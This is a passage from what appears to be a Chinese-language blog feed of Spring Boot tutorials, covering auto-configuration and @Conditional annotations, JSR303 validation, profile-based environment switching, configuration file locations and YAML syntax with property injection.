    <link href="/2021/04/11/SpringBoot/%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86/"/>
    <url>/2021/04/11/SpringBoot/%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>配置文件到底能写什么？怎么写？</p><p>SpringBoot官方文档中有大量的配置，我们无法全部记住</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbD7ibqw837BhN1F7lHdAMhMmYNCYF2tSdvUGv0y3X48tzetuuYc8tUMLg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="分析自动配置原理"><a href="#分析自动配置原理" class="headerlink" title="分析自动配置原理"></a>分析自动配置原理</h2><p>我们以<strong>HttpEncodingAutoConfiguration（Http编码自动配置）</strong>为例解释自动配置原理；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//表示这是一个配置类，和以前编写的配置文件一样，也可以给容器中添加组件；</span><br><span class="hljs-meta">@Configuration</span> <br><span class="hljs-comment">//启动指定类的ConfigurationProperties功能；  </span><br><span class="hljs-comment">//进入这个HttpProperties查看，将配置文件中对应的值和HttpProperties绑定起来； </span><br><span class="hljs-comment">//并把HttpProperties加入到ioc容器中</span><br><span class="hljs-meta">@EnableConfigurationProperties(&#123;HttpProperties.class&#125;)</span> <br><span class="hljs-comment">//Spring底层@Conditional注解  </span><br><span class="hljs-comment">//根据不同的条件判断，如果满足指定的条件，整个配置类里面的配置就会生效；</span><br><span class="hljs-comment">//这里的意思就是判断当前应用是否是web应用，如果是，当前配置类生效</span><br><span class="hljs-meta">@ConditionalOnWebApplication(    type = Type.SERVLET)</span><br><span class="hljs-comment">//判断当前项目有没有这个类CharacterEncodingFilter；SpringMVC中进行乱码解决的过滤器；</span><br><span class="hljs-meta">@ConditionalOnClass(&#123;CharacterEncodingFilter.class&#125;)</span><br><span class="hljs-comment">//判断配置文件中是否存在某个配置：spring.http.encoding.enabled； </span><br><span class="hljs-comment">//如果不存在，判断也是成立的  </span><br><span class="hljs-comment">//即使我们配置文件中不配置pring.http.encoding.enabled=true，也是默认生效的；</span><br><span class="hljs-meta">@ConditionalOnProperty(    prefix = &quot;spring.http.encoding&quot;,    value = &#123;&quot;enabled&quot;&#125;,    matchIfMissing = true)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HttpEncodingAutoConfiguration</span> </span>&#123;    <br>    <span class="hljs-comment">//他已经和SpringBoot的配置文件映射了    </span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Encoding properties;    <br>    <span class="hljs-comment">//只有一个有参构造器的情况下，参数的值就会从容器中拿    </span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">HttpEncodingAutoConfiguration</span><span class="hljs-params">(HttpProperties properties)</span> </span>&#123;        <br>        <span class="hljs-keyword">this</span>.properties = properties.getEncoding();   <br>    &#125;        <br>    <span class="hljs-comment">//给容器中添加一个组件，这个组件的某些值需要从properties中获取   </span><br>    <span class="hljs-meta">@Bean</span>    <br>    <span class="hljs-meta">@ConditionalOnMissingBean</span> <span class="hljs-comment">//判断容器没有这个组件？   </span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> CharacterEncodingFilter <span class="hljs-title">characterEncodingFilter</span><span class="hljs-params">()</span> </span>&#123;        <br>        CharacterEncodingFilter filter = <span class="hljs-keyword">new</span> OrderedCharacterEncodingFilter();<br>        filter.setEncoding(<span class="hljs-keyword">this</span>.properties.getCharset().name());<br>        filter.setForceRequestEncoding(<span class="hljs-keyword">this</span>.properties.shouldForce(org.springframework.boot.autoconfigure.http.HttpProperties.Encoding.Type.REQUEST));  <br>        <br>        filter.setForceResponseEncoding(<span class="hljs-keyword">this</span>.properties.shouldForce(org.springframework.boot.autoconfigure.http.HttpProperties.Encoding.Type.RESPONSE));       <br>        <span class="hljs-keyword">return</span> filter;    <br>    &#125;    <br>    <span class="hljs-comment">//。。。。。。。</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>一句话总结 ：根据当前不同的条件判断，决定这个配置类是否生效！</strong></p><ul><li>一但这个配置类生效；这个配置类就会给容器中添加各种组件；</li><li>这些组件的属性是从对应的properties类中获取的，这些类里面的每一个属性又是和配置文件绑定的；</li><li>所有在配置文件中能配置的属性都是在xxxxProperties类中封装着；</li><li>配置文件能配置什么就可以参照某个功能对应的这个属性类</li></ul><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//从配置文件中获取指定的值和bean的属性进行绑定</span><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;spring.http&quot;)</span> <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HttpProperties</span> </span>&#123;   <br>    <span class="hljs-comment">// .....</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>我们去配置文件里面试试前缀，看提示！</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbD4hfI8rrZuGnuFRBjKdaR8mvkyuGfHG1IxBPw0vcTP5LoXIJT9davlA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>这就是自动装配的原理！</strong></p><h2 id="精髓"><a href="#精髓" class="headerlink" title="精髓"></a>精髓</h2><p>1、SpringBoot启动会加载大量的自动配置类</p><p>2、我们看我们需要的功能有没有在SpringBoot默认写好的自动配置类当中；</p><p>3、我们再来看这个自动配置类中到底配置了哪些组件；（只要我们要用的组件存在在其中，我们就不需要再手动配置了）</p><p>4、给容器中自动配置类添加组件的时候，会从properties类中获取某些属性。我们只需要在配置文件中指定这些属性的值即可；</p><p><strong>xxxxAutoConfigurartion：自动配置类；</strong>给容器中添加组件</p><p><strong>xxxxProperties:封装配置文件中相关属性；</strong></p><h2 id="了解：-Conditional"><a href="#了解：-Conditional" class="headerlink" title="了解：@Conditional"></a>了解：@Conditional</h2><p>了解完自动装配的原理后，我们来关注一个细节问题，<strong>自动配置类必须在一定的条件下才能生效；</strong></p><p><strong>@Conditional派生注解（Spring注解版原生的@Conditional作用）</strong></p><p>作用：必须是@Conditional指定的条件成立，才给容器中添加组件，配置配里面的所有内容才生效；</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbDGcJRvdK3PtqHPAWYBBmpe1XBVjQJeiatU4vasEaxckHlOga1BV9RPaw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>那么多的自动配置类，必须在一定的条件下才能生效；也就是说，我们加载了这么多的配置类，但不是所有的都生效了。</strong></p><p>我们怎么知道哪些自动配置类生效？</p><p><strong>我们可以通过启用 debug=true属性；来让控制台打印自动配置报告，这样我们就可以很方便的知道哪些自动配置类生效；</strong></p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">#开启springboot的调试类<br>debug=true<br></code></pre></div></td></tr></table></figure><p><strong>Positive matches:（自动配置类启用的：正匹配）</strong></p><p><strong>Negative matches:（没有启动，没有匹配成功的自动配置类：负匹配）</strong></p><p><strong>Unconditional classes: （没有条件的类）</strong></p><p>【演示：查看输出的日志】</p><p>掌握吸收理解原理，即可以不变应万变！</p>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSR303数据校验</title>
    <link href="/2021/04/11/SpringBoot/JSR303%E6%95%B0%E6%8D%AE%E6%A0%A1%E9%AA%8C/"/>
    <url>/2021/04/11/SpringBoot/JSR303%E6%95%B0%E6%8D%AE%E6%A0%A1%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="先看看如何使用"><a href="#先看看如何使用" class="headerlink" title="先看看如何使用"></a>先看看如何使用</h2><p>Springboot中可以用@validated来校验数据，如果数据异常则会统一抛出异常，方便异常中心统一处理。我们这里来写个注解让我们的name只能支持Email格式；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Component</span> <span class="hljs-comment">//注册bean</span><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span><br><span class="hljs-meta">@Validated</span>  <span class="hljs-comment">//数据校验</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-meta">@Email(message=&quot;邮箱格式错误&quot;)</span> <span class="hljs-comment">//name必须是邮箱格式    </span><br>    <span class="hljs-keyword">private</span> String name;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行结果 ：default message [不是一个合法的电子邮件地址];</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbDYdR5f05BDysj0YVJMxadN0psDJKzXe7zyTrL9wFpTEHoiba0MsM11Fw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>使用数据校验，可以保证数据的正确性；</strong> </p><h2 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@NotNull(message=&quot;名字不能为空&quot;)</span><br><span class="hljs-keyword">private</span> String userName;<br><span class="hljs-meta">@Max(value=120,message=&quot;年龄最大不能查过120&quot;)</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br><span class="hljs-meta">@Email(message=&quot;邮箱格式错误&quot;)</span><br><span class="hljs-keyword">private</span> String email;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">空检查</span><br><span class="hljs-comment">@Null  验证对象是否为null</span><br><span class="hljs-comment">@NotNull    验证对象是否不为null, 无法查检长度为0的字符串</span><br><span class="hljs-comment">@NotBlank  检查约束字符串是不是Null还有被Trim的长度是否大于0,只对字符串,且会去掉前后空格.</span><br><span class="hljs-comment">@NotEmpty 检查约束元素是否为NULL或者是EMPTY.    </span><br><span class="hljs-comment">Booelan检查</span><br><span class="hljs-comment">@AssertTrue     验证 Boolean 对象是否为 true  </span><br><span class="hljs-comment">@AssertFalse    验证 Boolean 对象是否为 false      </span><br><span class="hljs-comment">长度检查</span><br><span class="hljs-comment">@Size(min=, max=) 验证对象（Array,Collection,Map,String）长度是否在给定的范围之内 </span><br><span class="hljs-comment">@Length(min=, max=) string is between min and max included.</span><br><span class="hljs-comment">日期检查</span><br><span class="hljs-comment">@Past       验证 Date 和 Calendar 对象是否在当前时间之前 </span><br><span class="hljs-comment">@Future     验证 Date 和 Calendar 对象是否在当前时间之后 </span><br><span class="hljs-comment">@Pattern    验证 String 对象是否符合正则表达式的规则</span><br><span class="hljs-comment">        .......等等除此以外，我们还可以自定义一些数据校验规则</span><br><span class="hljs-comment">*/</span><br><br></code></pre></div></td></tr></table></figure><p>多环境切换</p><p>profile是Spring对不同环境提供不同配置功能的支持，可以通过激活不同的环境版本，实现快速切换环境；</p><h2 id="多配置文件"><a href="#多配置文件" class="headerlink" title="多配置文件"></a>多配置文件</h2><p>我们在主配置文件编写的时候，文件名可以是 application-{profile}.properties/yml , 用来指定多个环境版本；</p><p><strong>例如：</strong></p><p>application-test.properties 代表测试环境配置</p><p>application-dev.properties 代表开发环境配置</p><p>但是Springboot并不会直接启动这些配置文件，它<strong>默认使用application.properties主配置文件</strong>；</p><p>我们需要通过一个配置来选择需要激活的环境：</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-comment">#比如在配置文件中指定使用dev环境，我们可以通过设置不同的端口号进行测试；</span><br><span class="hljs-comment">#我们启动SpringBoot，就可以看到已经切换到dev下的配置了；</span><br><span class="hljs-meta">spring.profiles.active</span>=<span class="hljs-string">dev</span><br></code></pre></div></td></tr></table></figure><h2 id="yaml的多文档块"><a href="#yaml的多文档块" class="headerlink" title="yaml的多文档块"></a>yaml的多文档块</h2><p>和properties配置文件中一样，但是使用yml去实现不需要创建多个配置文件，更加方便了 !</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span>  <br>    <span class="hljs-attr">port:</span> <span class="hljs-number">8081</span><br><span class="hljs-comment">#选择要激活那个环境块</span><br><span class="hljs-attr">spring:</span>  <br>    <span class="hljs-attr">profiles:</span>    <br>    <span class="hljs-attr">active:</span> <span class="hljs-string">prod</span><br><span class="hljs-meta">---</span><br><span class="hljs-attr">server:</span> <br><span class="hljs-attr">port:</span> <span class="hljs-number">8083</span><br><span class="hljs-attr">spring:</span> <br><span class="hljs-attr">profiles:</span> <span class="hljs-string">dev</span> <br><span class="hljs-comment">#配置环境的名称</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-attr">server:</span> <br><span class="hljs-attr">port:</span> <span class="hljs-number">8084</span><br><span class="hljs-attr">spring:</span>  <br><span class="hljs-attr">profiles:</span> <span class="hljs-string">prod</span>  <br><span class="hljs-comment">#配置环境的名称</span><br></code></pre></div></td></tr></table></figure><p><strong>注意：如果yml和properties同时都配置了端口，并且没有激活其他环境 ， 默认会使用properties配置文件的！</strong></p><h2 id="配置文件加载位置"><a href="#配置文件加载位置" class="headerlink" title="配置文件加载位置"></a>配置文件加载位置</h2><p><strong>外部加载配置文件的方式十分多，我们选择最常用的即可，在开发的资源文件中进行配置！</strong></p><p>官方外部配置文件说明参考文档</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7IPEXZtUAUBhnSZvUmrPzbDUoiazZ6ehegLG4doZK0uSJHribIqwVKiaNibSaYZSgjZf4kGzhLdGrkzzw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>springboot 启动会扫描以下位置的application.properties或者application.yml文件作为Spring boot的默认配置文件：</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">优先级<span class="hljs-number">1</span>：项目路径下的config文件夹配置文件<br>优先级<span class="hljs-number">2</span>：项目路径下配置文件<br>优先级<span class="hljs-number">3</span>：资源路径下的config文件夹配置文件<br>优先级<span class="hljs-number">4</span>：资源路径下配置文件<br></code></pre></div></td></tr></table></figure><p>优先级由高到底，高优先级的配置会覆盖低优先级的配置；</p><p><strong>SpringBoot会从这四个位置全部加载主配置文件；互补配置；</strong></p><p>我们在最低级的配置文件中设置一个项目访问路径的配置来测试互补问题；</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">#配置项目的访问路径<br>server.servlet.context-path=/kuang<br></code></pre></div></td></tr></table></figure><h2 id="拓展，运维小技巧"><a href="#拓展，运维小技巧" class="headerlink" title="拓展，运维小技巧"></a>拓展，运维小技巧</h2><p>指定位置加载配置文件</p><p>我们还可以通过spring.config.location来改变默认的配置文件位置</p><p>项目打包好以后，我们可以使用命令行参数的形式，启动项目的时候来指定配置文件的新位置；这种情况，一般是后期运维做的多，相同配置，外部指定的配置文件优先级最高</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">java -jar spring-boot-config.jar --spring.config.location=F:/application.properties<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Spring Boot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>基础</tag>
      
      <tag>Springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yaml语法学习</title>
    <link href="/2021/04/11/SpringBoot/yaml%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/04/11/SpringBoot/yaml%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="yaml语法学习"><a href="#yaml语法学习" class="headerlink" title="yaml语法学习"></a>yaml语法学习</h1><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><p>SpringBoot使用一个全局的配置文件 ， 配置文件名称是固定的</p><ul><li><p>application.properties</p></li><li><ul><li>语法结构 ：key=value</li></ul></li><li><p>application.yml</p></li><li><ul><li>语法结构 ：key：空格 value</li></ul></li></ul><p><strong>配置文件的作用 ：</strong>修改SpringBoot自动配置的默认值，因为SpringBoot在底层都给我们自动配置好了；</p><p>比如我们可以在配置文件中修改Tomcat 默认启动的端口号！测试一下！</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-meta">server.port</span>=<span class="hljs-string">8081</span><br></code></pre></div></td></tr></table></figure><h2 id="yaml概述"><a href="#yaml概述" class="headerlink" title="yaml概述"></a>yaml概述</h2><p>YAML是 “YAML Ain’t a Markup Language” （YAML不是一种标记语言）的递归缩写。在开发的这种语言时，YAML 的意思其实是：”Yet Another Markup Language”（仍是一种标记语言）</p><p><strong>这种语言以数据<strong><strong>作</strong></strong>为中心，而不是以标记语言为重点！</strong></p><p>以前的配置文件，大多数都是使用xml来配置；比如一个简单的端口配置，我们来对比下yaml和xml</p><p>传统xml配置：</p><figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">server</span>&gt;</span>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span>8081<span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">server</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>yaml配置：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">server：</span>  <br>  <span class="hljs-attr">prot:</span> <span class="hljs-number">8080</span><br></code></pre></div></td></tr></table></figure><h2 id="yaml基础语法"><a href="#yaml基础语法" class="headerlink" title="yaml基础语法"></a>yaml基础语法</h2><p>说明：语法要求严格！</p><p>1、空格不能省略</p><p>2、以缩进来控制层级关系，只要是左边对齐的一列数据都是同一个层级的。</p><p>3、属性和值的大小写都是十分敏感的。</p><p><strong>字面量：普通的值  [ 数字，布尔值，字符串  ]</strong></p><p>字面量直接写在后面就可以 ， 字符串默认不用加上双引号或者单引号；</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">k:</span> <span class="hljs-string">v</span><br></code></pre></div></td></tr></table></figure><p>注意：</p><ul><li><p>“ ” 双引号，不会转义字符串里面的特殊字符 ， 特殊字符会作为本身想表示的意思；</p><p>比如 ：name: “kuang \n shen”  输出 ：kuang  换行  shen</p></li><li><p>‘’ 单引号，会转义特殊字符 ， 特殊字符最终会变成和普通字符一样输出</p><p>比如 ：name: ‘kuang \n shen’  输出 ：kuang  \n  shen</p></li></ul><p><strong>对象、Map（键值对）</strong></p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-comment">#对象、Map格式</span><br><span class="hljs-attr">k:</span>    <br><span class="hljs-attr">v1:</span>   <br><span class="hljs-attr">v2:</span><br></code></pre></div></td></tr></table></figure><p>在下一行来写对象的属性和值得关系，注意缩进；比如：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">student:</span>   <br>  <span class="hljs-attr">name:</span> <span class="hljs-string">qinjiang</span>    <br>  <span class="hljs-attr">age:</span> <span class="hljs-number">3</span><br></code></pre></div></td></tr></table></figure><p>行内写法</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">student:</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">qinjiang</span>,<span class="hljs-attr">age:</span> <span class="hljs-number">3</span>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>数组（ List、set ）</strong></p><p>用 - 值表示数组中的一个元素,比如：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">pets:</span> <br>  <span class="hljs-bullet">-</span> <span class="hljs-string">cat</span> <br>  <span class="hljs-bullet">-</span> <span class="hljs-string">dog</span> <br>  <span class="hljs-bullet">-</span> <span class="hljs-string">pig</span><br></code></pre></div></td></tr></table></figure><p>行内写法</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">pets:</span> [<span class="hljs-string">cat</span>,<span class="hljs-string">dog</span>,<span class="hljs-string">pig</span>]<br></code></pre></div></td></tr></table></figure><p><strong>修改SpringBoot的默认端口号</strong></p><p>配置文件中添加，端口号的参数，就可以切换端口；</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span> <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8082</span><br></code></pre></div></td></tr></table></figure><p>注入配置文件</p><p>yaml文件更强大的地方在于，他可以给我们的实体类直接注入匹配值！</p><h2 id="yaml注入配置文件"><a href="#yaml注入配置文件" class="headerlink" title="yaml注入配置文件"></a>yaml注入配置文件</h2><p>1、在springboot项目中的resources目录下新建一个文件 application.yml</p><p>2、编写一个实体类 Dog；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.springboot.pojo;<br><span class="hljs-meta">@Component</span>  <span class="hljs-comment">//注册bean到容器中</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span> </span>&#123;    <br>    <span class="hljs-keyword">private</span> String name;   <br>    <span class="hljs-keyword">private</span> Integer age;        <br>    <span class="hljs-comment">//有参无参构造、get、set方法、toString()方法  </span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>3、思考，我们原来是如何给bean注入属性值的！@Value，给狗狗类测试一下：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Component</span> <span class="hljs-comment">//注册bean</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dog</span> </span>&#123;   <br>    <span class="hljs-meta">@Value(&quot;阿黄&quot;)</span>    <br>    <span class="hljs-keyword">private</span> String name;   <br>    <span class="hljs-meta">@Value(&quot;18&quot;)</span>    <br>    <span class="hljs-keyword">private</span> Integer age;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>4、在SpringBoot的测试类下注入狗狗输出一下；</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootTestclass</span> DemoApplicationTests &#123;<br>    <span class="hljs-meta">@Autowired</span> <span class="hljs-comment">//将狗狗自动注入进来   </span><br>    Dog dog;<br>    <span class="hljs-meta">@Test</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">contextLoads</span><span class="hljs-params">()</span> </span>&#123;       <br>        System.out.println(dog); <br>        <span class="hljs-comment">//打印看下狗狗对象    </span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>结果成功输出，@Value注入成功，这是我们原来的办法对吧。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/uJDAUKrGC7KtjyIb9NEaYlz0tCWSiboOYUjoO9N8358vr0uTf3KR0FP0C5QOC3uQOIrlcuy7v0jmkXw0PPM4U5w/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>5、我们在编写一个复杂一点的实体类：Person 类</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Component</span> <span class="hljs-comment">//注册bean到容器中</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;    <br>    <span class="hljs-keyword">private</span> String name;    <br>    <span class="hljs-keyword">private</span> Integer 